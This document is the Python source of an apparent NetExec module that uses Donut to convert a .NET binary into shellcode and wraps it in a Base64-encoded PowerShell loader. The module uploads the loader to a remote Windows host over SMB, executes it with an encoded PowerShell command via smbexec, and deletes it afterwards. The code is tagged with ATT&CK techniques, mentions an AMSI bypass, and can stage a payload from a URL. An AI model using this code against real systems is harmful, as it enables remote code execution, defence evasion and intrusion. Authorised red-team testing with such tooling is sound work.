from jinja2 import Environment, FileSystemLoader
from nxc.paths import DATA_PATH
import os
import donut
import hashlib
import base64
import tempfile

class NXCModule:
    """
    Donut:
    -------
    Module by @Lavender-exe
    PowerShell Loader by @EvilBytecode
    """

    name = "donut"
    description = "Execute .NET Binaries Remotely using Donut"
    supported_protocols = ['smb']
    opsec_safe = True
    multiple_hosts = False

    def __init__(self):
        self.context = None
        self.module_options = None
        self.tmp_directory  = tempfile.gettempdir()
        self.cleanup: bool  = False
        self.remote_tmp_dir = "C:\\Windows\\Temp\\"
        self.log_path       = "C:\\Windows\\Temp\\output.log"
        self.share: str     = "C"

    def options(self, context, module_options):
        """Required.
        BINARY_PATH Path to DotNet Binary
        BINARY_NAME Name of DotNet Binary

        Optional:
        LOADER_NAME Name of loader uploaded to remote host
        USE_REMOTE  Specify whether the shellcode loader should grab from a remote host or local (True/[False])
        STAGE_URL   Specify Stager IP/URL
        OUTPUT      Shellcode File Name and Path

        Usage: nxc smb $IP -u Username -p Password -M donut -o BINARY_PATH='/tmp/' BINARY_NAME=Seatbelt.exe PARAMS='antivirus'
        Extra: nxc smb $IP -u Username -p Password -M donut -o BINARY_PATH='/tmp/' BINARY_NAME=Seatbelt.exe USE_REMOTE=True STAGE_URL=http://127.0.0.1:8080/ PARAMS='antivirus'

        Remote URL is currently bugged, do not use the USE_REMOTE option
        """
        # Options
        self.path: str        = ""
        self.name: str        = ""
        self.output: str      = ""
        self.loader_name: str = ""

        # Preset Options
        self.arch: int      = 3 # AMD64+x86
        self.bypass: int    = 1 # Disable AMSI and WLDP bypass - detected
        self.entropy: int   = 3 # Default is 3
        self.format: int    = 8
        self.compress: int  = 2

        # Misc
        self.extension: str = ""
        self.tmp_share = self.remote_tmp_dir.split(":")[1]

        # Jinja
        self.shellcode: str = ""
        self.remote_url: str = ""
        self.use_remote: bool = False

        match self.format:
            case 1:
                self.extension = ".exe"
            case 2:
                self.extension = ".bs64"
            case 3:
                self.extension = ".rb"
            case 4:
                self.extension = ".c"
            case 5:
                self.extension = ".py"
            case 6:
                self.extension = ".ps1"
            case 7:
                self.extension = ".cs"
            case 8:
                self.extension = ".hex"
            case _:
                context.log.error("Invalid Format")

        if "BINARY_PATH" in module_options:
            self.path = module_options["BINARY_PATH"]

        if "BINARY_NAME" in module_options:
            self.name = module_options["BINARY_NAME"]
        self.filename = self.name.split(".")[0]

        if "LOADER_NAME" in module_options:
            self.loader_name = module_options["LOADER_NAME"]
        else: self.loader_name = "loader"

        if "PARAMS" in module_options:
            self.params = module_options["PARAMS"]
        else: self.params = ';'

        if "OUTPUT" in module_options:
            self.output = module_options["OUTPUT"]
        else:
            self.output = f"{self.tmp_directory}/{self.filename}{self.extension}"

        if "USE_REMOTE" in module_options:
            self.use_remote = module_options["USE_REMOTE"]

        if "STAGE_URL" in module_options and "USE_REMOTE" in module_options:
            self.remote_url = module_options["STAGE_URL"]

    def generate_shellcode(self):
        try:
            self.context.log.display(f"[T1587.001] Generating Shellcode [{self.name}]")

            self.context.log.debug(f"Binary Selected: {self.name}")
            self.context.log.debug(f"Output Path: {self.output}")
            self.context.log.debug(f"Architecture: {self.arch}")
            self.context.log.debug(f"Bypass Method: {self.bypass}")
            self.context.log.debug(f"Entropy: {self.entropy}")
            # self.context.log.debug(f"Shellcode: {self.shellcode}")

            self.binary = os.path.join(self.path, self.name)

            self.shellcode = donut.create(
                file=self.binary,
                output=self.output,
                arch=self.arch,
                bypass=self.bypass,
                entropy=self.entropy,
                format=self.format,
                params=self.params,
                compress = self.compress
            )

            self.md5sum_shc    = hashlib.md5(self.shellcode).hexdigest()
            self.sha256sum_shc = hashlib.sha256(self.shellcode).hexdigest()

            self.context.log.display(f"MD5 Hash of Shellcode [{self.output}]: {self.md5sum_shc}")
            self.context.log.display(f"SHA256 Hash of Shellcode [{self.output}]: {self.sha256sum_shc}")
            self.context.log.success(f"Shellcode Created in {self.output}!")
        except Exception as e:
            self.context.log.exception(f"Error whilst generating shellcode: {e}")

    def generate_loader(self):
        try:
            self.context.log.display(f"Generating Loader")

            self.context.log.debug(f"Use Remote: {self.use_remote}")
            self.context.log.debug(f"Remote URL: {self.remote_url}")

            self.context.log.debug(f"[T1027.013] Encoding Shellcode in Base64")
            b64_shellcode = base64.b64encode(self.shellcode).decode('utf-8')

            env = Environment(loader= FileSystemLoader(f"{DATA_PATH}/donut_module/"))
            template = env.get_template('shellcode_ldr.jinja')
            rendered = template.render(
                USE_REMOTE     = self.use_remote,
                REMOTE_URL     = self.remote_url,
                SHELLCODE      =  b64_shellcode,
                SHELLCODE_FILE = f"{self.filename}{self.extension}",
                LOG_PATH = self.log_path,
            )

            self.local_loader_path = f"{self.tmp_directory}/loader.ps1"
            with open(self.local_loader_path, 'w+') as loader_file:
                print(rendered, file=loader_file)

            self.md5sum_ldr = hashlib.md5(open(self.local_loader_path, 'rb').read()).hexdigest()
            self.sha256sum_ldr = hashlib.sha256(open(self.local_loader_path, 'rb').read()).hexdigest()

            self.context.log.display(f"MD5 Hash of Loader [{self.local_loader_path}]: {self.md5sum_ldr}")
            self.context.log.display(f"SHA256 Hash of Loader [{self.local_loader_path}]: {self.sha256sum_ldr}")
            self.context.log.success(f"Loader Created in {self.local_loader_path}!")

        except Exception as e:
            self.context.log.exception(f"Error whilst generating loader: {e}")

    def on_login(self, context, connection):
        self.connection =  connection
        self.context = context

        try:
            self.generate_shellcode()
            self.generate_loader()

            with open(self.local_loader_path, 'r') as loader:
                self.connection.conn.putFile(self.share, self.tmp_share + f"{self.loader_name}.ps1", loader.read)
                self.context.log.success(f"[T1608.001] Uploaded file {self.loader_name}.ps1 on \\\\{self.share}{self.tmp_share}")

            try:
                # Execute Loader
                command = base64.b64encode(f". {self.remote_tmp_dir}{self.loader_name}.ps1".encode("UTF-16LE")).decode("UTF-8")
                self.context.log.debug(f"[T1027.013] Encoding Command String: {command}")

                self.context.log.display(f"[T1059.001] Executing Loader")
                execute_command = f"powershell.exe -enc {command} "
                self.connection.execute(execute_command, methods=["smbexec"])

                # Read Output


            except Exception as e:
                self.context.log.fail("Error executing the loader")

            finally:
                self.delete_loader()

        except Exception as e:
            self.context.log.fail(f"Error writing file to share {self.share}: {e}")

    def delete_loader(self):
        try:
            self.connection.conn.deleteFile(self.share, self.tmp_share + f"{self.loader_name}.ps1")
            self.context.log.success('[T1070.004] Successfully deleted the loader')
        except Exception as e:
            self.context.log.fail(f"[OPSEC] Failed to delete the loader file in: {self.remote_tmp_dir}: {e}")
